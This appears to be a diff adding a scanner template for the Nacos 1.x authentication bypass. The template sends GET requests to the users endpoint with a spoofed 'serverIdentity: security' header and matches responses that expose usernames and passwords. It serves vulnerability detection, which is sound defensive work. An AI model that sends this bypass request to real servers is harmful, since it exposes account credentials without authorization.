@@ -1,0 +1,34 @@
+id: nacos-auth-bypass
+brief:
+    title: Nacos 1.x - Authentication Bypass
+    by: taielab
+    level: critical
+    about: Nacos 1.x was discovered. A default Nacos instance needs to modify the application.properties configuration file or add the JVM startup variable Dnacos.core.auth.enabled=true to enable the authenti...
+    label:
+        - nacos
+        - auth-bypass
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/nacos/v1/auth/users?pageNo=1&pageSize=9'
+        - '{{BaseURL}}/v1/auth/users?pageNo=1&pageSize=9'
+      head:
+        serverIdentity: security
+      signs:
+        - "on": word
+          has:
+            - '"totalCount":'
+            - '"username":'
+            - '"password":'
+            - '"pagesAvailable":'
+          in: body
+          need: all
+        - "on": word
+          has:
+            - application/json
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
